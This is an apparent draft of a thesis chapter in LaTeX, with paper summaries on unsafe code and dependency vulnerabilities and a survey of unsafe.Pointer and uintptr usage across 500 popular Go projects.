\section{OWASP Dependency Checker}\label{sec:owasp-dependency-checker}

Explain OWASP security project.

Show OWASP Dependency Checker program, show experimental Go extension for it.
This tool does no unsafe code analysis though, it checks for known vulnerabilities of the dependencies in the
OWASP database.


%% -----------------------------------------------------------------------------

\section{Work in progress: paper summaries}\label{sec:paper-summaries}


%% -----------------------------------------------------------------------------

\subsection{Understanding Memory and Thread Safety Practices and Issues in Real-World Rust Programs}
\label{subsec:understanding-memory-and-thread-safety-practices-and-issues-in-real-world-rust-programs}

Qin et al.~\cite{qin2020} contribute the first to their knowledge empirical study of bugs related to unsafe code blocks
in Rust.
They mention other empirical studies~\cite{difranco2017, lu2013, chou2001, leesatapornwongsa2016, jin2012, gunawi2014, gu2015}
none of which seem to be related to Rust or Go.
The authors analyze 5 projects, 5 libraries and 2 databases.
They randomly sample 850 unsafe usages out of those.
They analyze the usages, categorize them into classes, analyze the impact of the bugs and develop two new static code
checking tools.
In essence, this is exactly my thesis but done for Rust, and it's probably an excellent example of how to structure a
paper on this.

A main difference to this thesis is that the authors not only look into the current revision code, but explicitly look
through the Git history, filtering for commits that remove unsafe usages.
They further go through reported bugs on the software under analysis and look into the code how those bugs were fixed.
Bug data is retrieved from CVE and RustSec.
This is something I should probably do as well!

Within the 850 unsafe usages, the authors analyze 70 memory-safety issues and 100 concurrency bugs.
It sounds like they found all of those, but this high number is because they look at real-world bugs that were previously
reported.
Using their tools however, they also find about 5 to 10 new bugs that they disclosed to the developers.

Similar to my thesis, they explain the purpose of safe code and reasons why unsafe code might be needed.
They obviously focus on Rust, but some of the points will apply to Go as well.

The reasons to use unsafe code are clustered into these groups: Reuse existing code, convert C-array to Rust slice,
improve performance.
The authors find that often the use of unsafe code has good or unavoidable reasons.
Looking at the commit diffs, they find that unsafe code gets removed to fix memory safety, improve code structure,
improve thread safety, fix bugs, or because it was unnecessary in the first place.

The authors also look into the Rust standard library, which has similar uses of unsafe as the Go standard library.
Unsafe code often requires some preconditions on lifetime or input data to hold, and this can be achieved by encapsulating
it into an interior unsafe function that checks these conditions and might skip the unsafe code if they do not hold.

The areas of problems identified are buffer overflows, null-pointer dereferencing, reading uninitialized memory, invalid
free, use after free, and double free.
Fixing strategies were conditionally skipping the unsafe code, adjusting variable lifetime, or changing unsafe operands.

Rust also has thread safety problems, and problems the authors identified can be grouped into blocking and non-blocking.
Blocking bugs are caused due to incorrect scoping of auto-releasing mutexes.
Channels might also block.
Non-blocking bugs include data races and stem from incorrect scoping of shared data or confused ownership.

If a function's safety depends on how it is used, it might be better put into an encapsulation.

The authors suggest development of IDE extension visualizing scopes and lifetimes, development of Rust-tailored static
analysis tools (which they already contributed two), and dynamic analysis tools.
Due to the study language developers can also learn from design issues concerning the Rust language itself, because it
shows how developers adapt to new language concepts over time.


%% -----------------------------------------------------------------------------

\subsection{Is Rust Used Safely by Software Developers?}
\label{subsec:is-rust-used-safely-by-software-developers?}

Evens et al.~\cite{evans2020} present an empirical study of unsafe usages in Rust crates.
They only include statistical facts such as total number of unsage usages.
This is different from Qin et al.~\cite{qin2020} in that they did not do an in-depth analysis of potential bugs.
Still they got accepted at ICSE!

They found that most unsafe usage is to call other unsafe Rust code, while calling C code is less of a concern.
About a third of libraries contain unsafe code and more than half of them transitively do through dependencies.
The usage count in crates did not change much over the course of 10 months work.
More popular libraries are more likely to contain more unsafe code because they encapsulate more popular C libraries.

The authors conducted a N=20 survey on Reddit, revealing that 10\% of developers used unsafe to make the code compile.
Other popular reasons included performance optimizations, advanced data structures, and unsafe code offering a slicker
and "more elegant" interface.
Most developers employed more testing, static and dynamic analysis, and fuzzing when using unsafe code, but many also
said they would "look carefully on the code".
I'd suspect this is not an effective approach.

The authors developed an augmented Rust CFG and algorithm to detect potentially unsafe functions in all Rust crates that
would compile.


%% -----------------------------------------------------------------------------

\subsection{Escape from Escape Analysis of Golang}
\label{subsec:escape-from-escape-analysis-of-golang}

Wang et al.~\cite{wang2020} propose an approach to make heap memory usage in Go more effective by improving the escape
analysis algorithm.
The current algorithm is very conservative.
In particular, the authors try improve a specific type of escape analysis: passing a pointer into a function call will
make that object escape.
They contribute an optimizer that always replaces such calls by an intermediate cast of the pointer into a uintptr
variable and then back to a pointer, both through the use of unsafe.Pointer.
This breaks the escape analysis chain and will make Go escape only the new pointer to the heap, not the entire previous
data structure.
After the identification of such snippets in the code comes a verification stage that will check whether the function
call is synchronous.
In that case, the underlying variable cannot be freed before the end of the function, and the optimization is correct.
If the call is asynchronous, the optimizer checks if the variable is used in any other Goroutine, in which case the
optimization will not be done.
Otherwise it is deemed valid.

The authors mention escape analysis in other language~\cite{hill2002, hannan1998, choi1999}.

This is an interesting related work because the tool to break escape analysis, the cast to uintptr and back, is exactly
the problem in the common unsafe slice cast that I describe in the other sections.

The authors evaluate performance and correctness on 10 open-source and 10 industrial projects.
Their data set includes kubernetes.

The paper includes advertisement for a company and curiously uses Go 1.9 although the paper is to be published at ICSE
2020.


%% -----------------------------------------------------------------------------

\subsection{Why Cant Johnny Fix Vulnerabilities: A Usability Evaluation of Static Analysis Tools for Security}
\label{subsec:why-cant-johnny-fix-vulnerabilities:-a-usability-evaluation-of-static-analysis-tools-for-security}

Smith et al.~\cite{smith2020} conduct a developer survey on usability problems with static code analysis tools.
They contribute insights into why developers can often not get the most beneficial outcome from such tools.
The mainly analyze Java analysis tools such as Find Bugs, CheckStyle and PMD\@.

The problem areas found are code navigation issues, missing or buried information, interface scalability for large
projects (such as a huge control flow graph), inaccuracy of analysis, code disconnect (meaning the proposed fix to a
problem did not resemble the previous problem anymore), and workflow continuity (meaning the developers had to
constantly switch between the tool report and the code editor).

The authors propose as improvements a clear communication of what and how to fix, alerts that are located within the
editable source code, contextualized and meaningful notifications, and a good integration into existing development
workflows such as CI.

Minor relevance, probably cite in the chapter about the linting tools.


%% -----------------------------------------------------------------------------

\subsection{Source Code Vulnerabilities in IoT Software Systems}
\label{subsec:source-code-vulnerabilities-in-iot-software-systems}

Alnaeli et al.~\cite{alnaeli2017} contribute a study of unsafe C code patterns, that is well-known unsafe
functions such as strcpy, in IoT software.
They count how many unsafe and how many safe functions they find, and compare them with each other to discover trends.

Similar to my work, they search for unsafe code patterns in open-source code.
Similar to my work, they also look at changes over time.
In contrast to my work, they analyze C code instead of Go code.

The authors find that the systems under review have neither introduced more nor removed some of the unsafe functions
over time.
They conclude that developers might be unaware of the presence of the functions, their implications, or both.
They suggest better developer education on security-related consequences of these functions.

Minor relevance, cite in survey chapter.


%% -----------------------------------------------------------------------------

\subsection{Statically Detecting Likely Buffer Overflow Vulnerabilities}
\label{subsec:statically-detecting-likely-buffer-overflow-vulnerabilities}

In their (quite old) 2001 paper, Larochelle and David Evans~\cite{larochelle2001} write about static code analysis to
detect likely buffer overflow vulnerabilities in C code.
They cite a paper assuming that buffer overflows would still be relevant in 20 years, that would be 2019.
That would be true but I'll have to see if it makes sense to also cite this and add a comment.

Similar to my work, this is using static analysis to find problems in code.
But contrary to my work, it's for C code, not Go.
They also talk about simple overflow exploitation techniques, in the context of C\@.
I can and probably should do the same, with a focus on Go.

The authors exploit semantic comments to enable local checking of interprocedural properties, they focus on lightweight
analysis that does not add much overhead, and they use heuristics.
They conduct their study using the LClint annotation tool also developed by Evans.
They note that annotating the standard library would bring a lot of security even without annotating actual programs,
because most vulnerabilities come from using insecure or improperly used functions.
This I can use too to argue for better auditing of standard libraries and developer education as well.

The annotations available include data constraints, such as x > y, and control flow constraints such as branch-specific
annotations.


%% -----------------------------------------------------------------------------

\subsection{Vulnerable Open Source Dependencies: Counting Those That Matter}
\label{subsec:vulnerable-open-source-dependencies:-counting-those-that-matter}

Pashchenko et al.~\cite{pashchenko2018} in a quite recent study propose a way of counting relevant dependencies in a
project and identifying whether the dependencies are vulnerable.
The study is done for Java, and specifically for Maven dependency management.
The authors note that failure of identifying relevant dependencies might lead to bad allocation of development resources.

A central point is dependency scoping (production versus testing) which many studies did not incorporate in the past.
If a vulnerability is found in a dependency only relevant for testing, it might not be worth to put resources onto its
mitigation.
This is extremely relevant for me!
As of now, I also do not distinguish between testing and production library.
This is probably not even possible with the Go dependency management system.
A key insight for distiguishing this related work from my work would be to highlight the relative instability of the
incredibly new Golang dependency system compared to the very seasoned Maven system.
The authors find that around 20 \% of dependencies are for testing only (not deployed).

Furthermore, it is very important to transitively look at dependencies of dependencies because they can just as well
introduce problems into the main project.
This is something my study already perfectly does.

The authors contribute a method of determining whether a dependency is actively maintained or halted.
It is done by looking at the release cycle with an exponential smoothing model.
There are only a few vulnerabilities in halted libraries that they found, but those are especially important because
mitigation cannot be done by a simple upgrade.

The authors introduce the important concept of reliability for bug fixing.
This is, the developers are directly reliable for fixing their main package and own dependencies, and they need to
make sure their direct dependencies are up to date but cannot fix them.
The indirect, or transitive, depencies are out of responsiblity for the developers since they cannot even be upgraded
manually.
A major finding is that grouping the dependencies of a project into these reliability groups gives a better picture into
how much the developers can actually do, and the authors find that for more than 80 \% of the problems the developers
can mitigate themselves through an upgrade or fixing their own code.

Identification of vulnerabilities is done by matching code patterns to vulnerability databases both in a manual and an
automated fashion.
The developers contribute a tool that can provide annotations to the code as to which vulnerablity it might belong.

A very relevant insight for me: the authors first did an incorrect dependency popularity measurement.
They counted the times the dependency gets imported, possibly distorting the popularity if a project is decomposed into
many small own dependencies~\cite{sajnani2014}.
A better way is to count the projects that include the dependency.
I already use the second approach in Table~\ref{tbl:pull-requests} for the supplied pull requests for fixes.
However, I need to make sure in the plot generation that I use the same metrics.

The authors compare to other ecosystems such as Pip and NPM, but not Go.
For NPM, they cite a relevant study on Javascript dependency vulnerabilites~\cite{lauinger2017}, which showed that
transitive project dependencies are more vulnerable than direct dependencies.
They reason that this might be the case because developers are less aware of the existence of those dependencies, and
have less control about them.
The authors highlight that this is a finding specific to Javascript because NPM allows several versions of the same
library to be used in the same project, while Maven does not.
I need to find out if this is possible with Go modules too, I think it is not.
I think Go behaves like Maven.
However, I need to highlight that in my data survey there are of course different versions of the same library, and this
is even necessary to analyze unsafe usage over time.

Within threats to validity, the authors note that the selection of libraries was potentially biased, that the
vulnerability database may not cover all vulnerabilites, the study only used Maven, and that project IDs were approximated.

This is an extremely valuable related work that I definitely need to cite both in the background on Go dependencies
and the survey as well.


%% -----------------------------------------------------------------------------

\subsection{Do developers update their library dependencies?}
\label{subsec:do-developers-update-their-library-dependencies?}

Kula et al.~\cite{kula2017} conduct a study on Github projects and developer survey on how dependencies are updated.
They find that developers often think library updates are extra work and deprioritize it.
The study is done on Maven and Java and finds that libraries are rarely updated.
Specifically, security updates are included less often because developers were unaware of them.
Upon getting the news, developers promptly updated away from vulnerable dependencies.

Available updates are traditionally announced on the homepage of the library, through change logs and semantic versioning.
Other possibilities include security advisories.

When selecting vulnerabilities for analyzing security advisories, the authors only use denial of service and man in the
middle vulnerabilities.
This means that the survey is both rather shallow and biased towards web projects.

This work is minor to medium relevant.
It's to include in a list of examples to cite, but on its own it is less effective as a related work than the others
I read.


%% -----------------------------------------------------------------------------

\subsection{Can automated pull requests encourage software developers to upgrade out-of-date dependencies?}
\label{subsec:can-automated-pull-requests-encourage-software-developers-to-upgrade-out-of-date-dependencies?}

Mirhosseini et al.~\cite{mirhosseini2017} answer the research question whether automated pull requests such as greenkeeper
or pyup can encourage developers to update dependencies.
They find that badges provide a good incentive to developers to keep them green by updating.
Automated pull requests offer an actionable solution to update, but notification fatigue can work against update
discipline.
That is, maintaining many open source projects can lead to a lot of pull request notifications, especially if there is
one opened for every single dependency.

The authors analyze about 7,400 Github projects, grouped into badges, automated pull requests, and a baseline.
Automated pull requests lead to 1.6 times, badges to 1.4 higher probability to update.
Pull requests also mean faster updates.
On purpose, they use a broad sample of Github projects instead of the most popular ones.
This is something I should talk about too in my work!
In summary, both versions of update helpers had a positive impact, with pull requests being in the lead.

A surprising finding was that only about 30 \% of automated PRs was merged, compared to about 80 \% of general PRs.
Some merged update PRs were also downgraded again after some days, hinting incompatibilities introduced.
Using CI correlated with marginally higher merge rate.

They also conduct a developer survey.
Developers had mixed feelings about badges versus automated pull requests.
They suggested to use batched updates, resulting in fewer pull requests and less fatigue.

The authors identified through survey different updating strategies: quick, scheduled, reactive.
A developer said, reasoned through possible new errors in libraries and minor benefits, that in the reality of commercial
software engineering, staying on bleeding edge library versions usually costs more than it benefits, and the better
approach is to update infrequently.
My work should act on this and argue that this is true for feature releases but very bad for security releases.
Maybe one could do something with semver here.

The survey also showed that a single bad update of one library can very strongly cause developers to be reluctant from
updating in the future.
From this, we can argue for high responsible in library releasing to not destroy the necessary environment for timely
ships of security fixes.

The authors further cite another work stating that vulnerabilities are often contained in dependencies~\cite{xia2014}.
CI is not always a guarantee that an update does not break the software.
Badges can counteract fatigue, and more importantly they rely on a different mechanism: social pressure.

This has very relevance for me because of the survey on update preferences.
It is interesting to cite this within the argument that libraries must be updated in order to remove already fixed
vulnerabilities from dependent projects.


%% -----------------------------------------------------------------------------

\subsection{Understanding the Origins of Mobile App Vulnerabilities: A Large-scale Measurement Study of Free and Paid Apps}
\label{subsec:understanding-the-origins-of-mobile-app-vulnerabilities:-a-large-scale-measurement-study-of-free-and-paid-apps}

Watanabe et al.~\cite{watanabe2017} conduct a study on the origins of mobile vulnerabilities.
They inspect both free and paid Android apps.
They find that 70 \% of bugs come from dependencies, 50 \% from third-party dependencies.
More expensive and/or popular apps tended to have more vulnerabilities.

An interesting finding for me: 50 \% of vulnerabilities were found in unreachable code.
As I also already found one manual vulnerability that was unreachable, it might be interesting to argue that there is a
very feasible risk that the studies are distorted due to failure to identify dead code.

The authors claim that a limitation of static analysis is that obfuscated, runtime-dynamic code might introduce
vulnerabilities that the analysis missed.
This might be true, but such code is also to be treated as dangerous in my opinion.

In contrast to my work, this is based on Android and Java at best, not Go.

This is only minor relevant as another study.


%% -----------------------------------------------------------------------------

\subsection{Understanding Real-World Concurrency Bugs in Go}
\label{subsec:understanding-real-world-concurrency-bugs-in-go}

Tu et al.~\cite{tu2019} present a very recent (2019) study on Go concurrency bugs.
They summarize how Go was designed to be an especially safe and easy-to-use language for concurrency.
Every Go major release has improved on concurrency.
Go offers both shared memory (through use of Mutex, RWMutex, Cond, atomic, Once, WaitGroup) and message passing(through
chan).
Channels can be buffered and unbuffered.
New additions include the select statement, context, and Pipe.

The authors analyzed six open-source Go applications, and inspected about 170 bugs.
They used commit logs and keywords to find concurrency-related bugs and fixes.
Then they grouped them on two dimensions into blocking / non-blocking, and message passing / shared memory.
They answered the research question of how often goroutines get used in the real world, statically and dynamically.

Similar to my work, their static analysis just involved finding instances of the go keyword.
Dynamic analysis is more complicated though.
They found that goroutines are used very often in the sample programs.
Similar to my work, they compared the frequency of the two methods of concurrency synchronization.
I can do a similar argument when comparing different keywords of unsafe code.
The authors find that usage trends were stable over time.

The authors analyzed commit messages and filtered for the following keywords: race, deadlock, synchronization,
concurrency, lock, mutex, atomic, compete, context, once, goroutine leak.
They randomly sampled, filtered for actual bug fixings, and then manually analzed and grouped them.
This is something I should do as well.
Bugs were split about 50/50 between message passing and shared memory.

The conclusion is that new Go mechanisms that should make concurrency easier and safer can actually introduce new bugs.

This is an extremely relevant related work.
Cite this both in related work, background, and survey.


%% -----------------------------------------------------------------------------

\subsection{A Dataset of Parametric Cryptographic Misuses}
\label{subsec:a-dataset-of-parametric-cryptographic-misuses}

Wickert et al.~\cite{wickert2019} present a labeled data set of 201 crypto API misuses.
They focus on Java crypto API JCA parametric misuses, that is the usage of insecure configuration and/or wrong
parameters to the crypto API.
They initially downloaded more than 1300 Java projects from Github, but only about 130 of them contained the crypto
APIs, 53 of them could be built, and 39 of them could be analyzed successfully by a static analysis tool.
Still, in the remaining 39 projects plus some manual investigation they found 201 misuses in 44 projects.

The authors sorted the misuses by two dimensions: API used (e.g. Cipher, MessageDigest, \ldots) and misuse category (e.g.
transformation algorithm, incorrect randomization, key, initialization vector, or iteration count).

The authors included their findings into MUBench and performed a benchmark on precision and recall on the FindBugs tool.
Furthermore, they iterate on how their data set can be used as a foundation for further research, e.g. benchmarking new
static analysis tools or training classifiers.

Similar to my work, they mined projects from Github and looked for security problems.
In contrast to my work, they focused on Java and crypto APIs, not Go and unsafe pointers.
They state that there exists possible bias in project selection, and that approaches that are secure today might become
insecure in the future.

Medium relevant, cite in related work and both survey chapters I think.



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% former chapter 4

\section{Evaluation}

%% -----------------------------------------------------------------------------

\chapter{Survey of unsafe code usages in popular Go projects}\label{ch:survey}



%% -----------------------------------------------------------------------------

\section{Most popular open source Go projects}\label{sec:most-popular-projects}

I downloaded the top 500 most popular (by number of stars) Go projects from Github.
They can be found through Github search.

Using the \texttt{github.com/google/go-github/github}~\cite{gogithub} and \texttt{github.com/go-git/go-git/v5}~\cite{gogit}
Go libraries, I found, saved, downloaded, and checkout out these projects using a Go program.

The projects, including the revision I checked out, and some meta data is shown in Table~\ref{tbl:projects}.


%% -----------------------------------------------------------------------------

\section{Methods of generating data points}\label{sec:survey-acquisition-methods}

Iteration of three data acquisition programs, getting faster and faster: Bash, Python, Go.

Loading packages used by the program by running \texttt{go list -deps -json ./...}, then parsing the JSON output.

CSV is used to write data to disk.
Interop with Go structure types is achieved using the \texttt{github.com/gocarina/gocsv}~\cite{gocsv} library.

Program uses the following steps:

\begin{enumerate}
    \item Read projects to analyze from CSV file
    \item Get package list for a given project
    \item Run requested analysis type
    \item Parse output and match findings to package and file
    \item Append findings for this project to CSV file
    \item Continue with step 2 for the next project, until done
\end{enumerate}

There are five different analysis types:

\begin{itemize}
    \item Grep
    \item Go Vet
    \item Gosec
    \item Abstract Syntax Tree
    \item My linter (go-safer)
\end{itemize}

The time needed to run these analysis on the 500 projects described in Section~\ref{sec:most-popular-projects} is shown
in Table~\ref{tbl:survey-analysis-wallclocktime}.

\begin{table}[h]
    \centering
    \caption{Wall-clock runtime for different analysis types used for the data survey}
    \label{tbl:survey-analysis-wallclocktime}
    \begin{tabular}{ll}
        \toprule
        Analysis Type & Wall-Clock Time \\
        \midrule
        (Project Download) & 4 hours \\
        Grep & 15 minutes \\
        Go Vet & 3 hours \\
        Gosec & 24 hours \\
        Abstract Syntax Tree & 1 hour \\
        Go-Safer Linter & 3.5 hours \\
        \bottomrule
    \end{tabular}
\end{table}


%% -----------------------------------------------------------------------------

\section{Description and structure of data set}\label{sec:survey-dataset}

In the data set I obtained, there are the following objects: projects, packages, modules,  Grep findings, Go Vet findings,
Gosec findings, Go-safer (linter) findings, AST unsafe findings, AST functions, AST statements, and error conditions.

The data set size in terms of object count is shown in Table~\ref{tbl:survey-dataset-size}

\begin{table}[h]
    \centering
    \caption{Survey data set size in terms of object count}
    \label{tbl:survey-dataset-size}
    \begin{tabular}{lr}
        \toprule
        Object type & Data point count \\
        \midrule
        Projects & 495 \\
        Packages & 40,384 \\
        Modules & 3,202 \\
        Grep findings & 2,850,140 \\
        Go Vet findings & 120,416 \\
        Gosec findings & 124,165 \\
        Go-safer (linter) findings & 321 \\
        AST unsafe findings & 2,590,346 \\
        AST functions & 782,760 \\
        AST statements & 1,205,214 \\
        \bottomrule
    \end{tabular}
\end{table}

A thing worth mentioning is that there a bit less \acrshort{ast} unsafe findings compared to the Grep unsafe findings.
This is because the Grep run includes comments containing \texttt{unsafe.Pointer}, while the AST run does not.

The different data set objects have several fields that are included in the CSV data.
Appendix~\ref{ch:app:data-structure} shows the data structure and data types of each object types in multiple tables.


%% -----------------------------------------------------------------------------

\section{Methods of analyzing the data}\label{sec:survey-analysis-methods}

How did I process the data set?
Approach to build results etc.


%% -----------------------------------------------------------------------------

\subsection{Jupyter Notebooks}\label{subsec:survey-jupyter}

Describe purpose, deployment and notebook structure.


%% -----------------------------------------------------------------------------

\subsection{Python Flask application for manual classification}\label{subsec:survey-classification}

Describe purpose, development and deployment.


%% -----------------------------------------------------------------------------

\section{Survey Results}\label{sec:survey-results}

These sections go through the results of the data survey.
Unsafe usages include usages of \texttt{unsafe.Pointer}, \texttt{uintptr}, \texttt{reflect.SliceHeader} and more.


%% -----------------------------------------------------------------------------

\subsection{Usage statistics in projects, modules, packages, and registries}\label{subsec:results-stats}

First is some statistics about how many unsafe usages were found using Grep.
Unsafe usages are occurrences of the following tokens:

\begin{itemize}
    \item \texttt{unsafe.Pointer}
    \item \texttt{unsafe.Sizeof}
    \item \texttt{unsafe.Alignof}
    \item \texttt{unsafe.Offsetof}
    \item \texttt{uintptr}
    \item \texttt{reflect.SliceHeader}
    \item \texttt{reflect.StringHeader}
\end{itemize}

Figure~\ref{fig:unsafe-usages-by-project-n30} shows the top 30 projects with the most unsafe usages.
We see that \texttt{kubernetes/kubernetes} and \texttt{rancher/k3s} lead the list with more than 10,000 usages.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/stats/unsafe-usages-by-project-n30.tikz}}
    \caption{Unsafe usages by project for the top 30 projects with most usages}
    \label{fig:unsafe-usages-by-project-n30}
\end{figure}

Looking at individual modules, we see from Figure~\ref{fig:unsafe-usages-by-module-n30} that most usages are contained
in the Go standard library.
Second place with still a lot of unsafe usages is the \texttt{k8s/kubernetes} module, followed by
\texttt{golang.org/x/sys}.
The \texttt{sys} module already has some space to the \texttt{kubernetes} one, and after that the modules have much
fewer unsafe usages.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/stats/unsafe-usages-by-module-n30.tikz}}
    \caption{Unsafe usages by module for the top 30 modules with most usages}
    \label{fig:unsafe-usages-by-module-n30}
\end{figure}

Figure~\ref{fig:unsafe-usages-by-package-n30} shows the top 30 packages with the most unsafe usages.
Keeping in mind that we just learned that the standard library has the most usages, we can now see that they are mostly
in the \texttt{runtime}, \texttt{syscall}, and \texttt{reflect} packages.
We can identify some more packages from this figure which are analyzed in more detail in Chapter~\ref{ch:code-vulnerabilities}.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/stats/unsafe-usages-by-package-n30.tikz}}
    \caption{Unsafe usages by package for the top 30 packages with most usages}
    \label{fig:unsafe-usages-by-package-n30}
\end{figure}

Looking at Figure~\ref{fig:unsafe-usages-by-registry}, we see that if we skip the standard library and the Kubernetes
situation, almost all unsafe usages are contained in packages that are hosted on github.com.
However, the data also shows (without plot) that github.com is by far the largest registry, therefore this is expected.
The other big registry is gorgonia.org, which hosts a machine learning framework that will be part of the discussion in
Chapter~\ref{ch:code-vulnerabilities}.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=7cm]{assets/plots/stats/unsafe-usages-by-registry-n12.tikz}}
    \caption{Unsafe usages by registry for the top 12 registries with most usages}
    \label{fig:unsafe-usages-by-registry}
\end{figure}

Finally, we see from Figure~\ref{fig:fraction-of-unsafe-modules-and-packages} that only about 20 percent of modules, and
less than 5 percent of packages contain unsafe usages.
We conclude that they are clustered in a small group of packages.
In other words, if a package contains \textit{any} unsafe usage then it will probably contain \textit{many}.

\begin{figure}[ht]
    \centering
    \subfigure[Modules]{
        {\scriptsize \includegraphics[width=0.4\textwidth]{assets/plots/stats/pie-modules.tikz}}
        \label{subfig:fraction-of-unsafe-modules}
    }
    \subfigure[Packages]{
        {\scriptsize \includegraphics[width=0.4\textwidth]{assets/plots/stats/pie-packages.tikz}}
        \label{subfig:fraction-of-unsafe-packages}
    }
    \caption{Fraction of modules and packages containing unsafe usages}
    \label{fig:fraction-of-unsafe-modules-and-packages}
\end{figure}


%% -----------------------------------------------------------------------------

\subsection{Distribution of different unsafe token types}\label{subsec:results-tokens-distribution}

As stated above, the Grep analysis searched for different types of unsafe tokens.
Figure~\ref{fig:unsafe-tokens-distribution} gives an overview of the distribution.
We see that \texttt{unsafe.Pointer} and \texttt{uintptr} are by far the most common, with \texttt{uintptr} being only
slightly in the lead.
Looking at the types that are less common might be even more interesting than the most common ones.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=0.5\textwidth, height=9cm]{assets/plots/tokens-distribution/distribution-different-unsafe-token-types.tikz}}
    \caption{Distribution of different types of unsafe token types}
    \label{fig:unsafe-tokens-distribution}
\end{figure}


%% -----------------------------------------------------------------------------

\subsection{Module and package popularity}\label{subsec:results-popularity}

To understand the severity of unsafe usage findings, we correlate with the popularity of modules and packages.
Popularity is measured in terms of number of projects that include the module / package.

Figure~\ref{fig:popularity-module} shows the most popular modules.
The Go standard library as well as some almost-standard, official utility modules are most popular.
The first real non-standard module is \texttt{github.com/golang/protobuf}.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/popularity/popularity-module-n30.tikz}}
    \caption{Module popularity by number of importing projects, N=30}
    \label{fig:popularity-module}
\end{figure}

Figure~\ref{fig:popularity-package} shows the most popular packages:

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/popularity/popularity-package-without-std-n30.tikz}}
    \caption{Package popularity by number of importing projects, excluding standard library, N=30}
    \label{fig:popularity-package}
\end{figure}


%% -----------------------------------------------------------------------------

\subsection{Fluctuation of unsafe usages count over time}\label{subsec:results-time-change}

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=10cm]{assets/plots/time-change/fluctuation-in-versions-of-sys.tikz}}
    \caption{Number of unsafe usages in different versions (every other) of sys over time}
    \label{fig:fluctuation-in-versions-of-sys}
\end{figure}

Figure~\ref{fig:fluctuation-in-versions-of-sys} shows the number of \texttt{unsafe.Pointer} usages in different versions
of the \texttt{golang.org/x/sys} package.
We can see that the number changes over time.
In this case, it ranges between 315 and 440.
This is because different versions of the same package can contain different code, and therefore a different number of
\texttt{unsafe.Pointer} usages.
Here the reason for this is that syscall stubs get added or removed.

For \texttt{sys}, the number of unsafe usages gradually increases over time.
Todo: include an example commit compare.

We can take away two important insights from this.

\begin{enumerate}
    \item It is important to pin the version of the module / package when doing analysis on the code, e.g.\ running a
    survey on the usage of unsafe code patterns.
    \item Even when a vulnerability is fixed in the latest version of a library, projects that use that library will
    still be affected until they upgrade the library.
    Different projects can use different versions of the same library.
\end{enumerate}

%% -----------------------------------------------------------------------------

\subsection{Correlations of unsafe tokens used together in a file or statement}\label{subsec:results-correlation-together}

The data shows that 1061 files contain at least one \texttt{unsafe.Pointer}.
1147 files contain at least one \texttt{uintptr}.
There are 496 files that contain each at least one of both.

In terms of line, there are 12135 distinct lines of code that contain \texttt{unsafe.Pointer}.
There are 11951 lines that contain \texttt{uintptr}.
We can already see that since there are more \texttt{uintptr} occurrences in total, but less lines, that \texttt{uintptr}
is clustered more within the same line.

There are 6846 usages of \texttt{unsafe.Pointer} that are within files where at least one other \texttt{uintptr} occurs.
On the other hand, 5939 usages of \texttt{uintptr} are in files where at least one other \texttt{unsafe.Pointer} occurs.

Of about 21,000 unsafe usages, 11,738 are in a function that contains another usage, while 8,841 are not.

There are 13,757 usages in statements that contain no further unsafe usage.
7,246 usages are within statements where at least one other unsafe usage occurs within that same statement.
Those are distributed among 2,123 statements, making an average of 3.4 unsafe usages per statement for the statements
that contain at least one usage.

The important part is that unsafe usages may occur in clusters.
Those are interesting to look into.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=3cm]{assets/plots/correlation-together/use-in-same-line.tikz}}
    \caption{Usage of unsafe together in the same line}
    \label{fig:correlations-unsafe-usage-same-line}
\end{figure}

\begin{figure}[ht]
    \centering
    \subfigure[Functions]{
        {\scriptsize \includegraphics[width=0.4\textwidth]{assets/plots/correlation-together/use-in-same-function.tikz}}
        \label{subfig:correlations-unsafe-usage-same-function}
    }
    \subfigure[Statements]{
        {\scriptsize \includegraphics[width=0.4\textwidth]{assets/plots/correlation-together/use-in-same-statement.tikz}}
        \label{subfig:correlations-unsafe-usage-same-statement}
    }
    \caption{Usage of unsafe in the same function or statement}
    \label{fig:correlations-unsafe-usage-same-function-and-statement}
\end{figure}


%% -----------------------------------------------------------------------------

\subsection{Go Vet and Gosec tools coverage of unsafe snippets}\label{subsec:results-vet-gosec}

The Gosec coverage is not interesting because Gosec only has a single rule concerning unsafe usages which is the
existence of \texttt{unsafe.Pointer} in the code.
This is already identified by the Grep analysis.

Go Vet has an analysis pass for possible misuses of \texttt{unsafe.Pointer}.
Figure~\ref{fig:vet-findings-per-project-n30} shows the Vet findings per project for the top 30 projects with the most
findings.
We see that the projects with the most findings are \texttt{gohugoio/hugo}, \texttt{cli/cli},
and \texttt{sql-machine-learning/sqlflow}.
They are different projects than the ones with the highest numbers of unsafe usages.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/vet-gosec/vet-findings-per-project-n30.tikz}}
    \caption{Go Vet findings per projects for the top 30 projects with the most findings}
    \label{fig:vet-findings-per-project-n30}
\end{figure}

From the correlation between findings shown in Figure~\ref{fig:correlation-vet-grep-findings}, we see that Vet findings
are almost completely unrelated to the unsafe findings.
There are only about 200 lines where an unsafe usage was found and Go Vet issued a warning.
Of those not even all warnings were related to a possible misuse of \texttt{unsafe.Pointer}.
We can conclude that either almost all projects use \texttt{unsafe.Pointer} only in a safe way, or Go Vet is not very
good at detecting possible misuses.
In the following chapters, we will see that the second case is true.
I will also present a new linter tool that detects some of the unsafe patterns identified in this thesis.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=4cm]{assets/plots/vet-gosec/vet-findings-correlated-unsafe-findings.tikz}}
    \caption{Correlation of Go Vet and Grep unsafe findings}
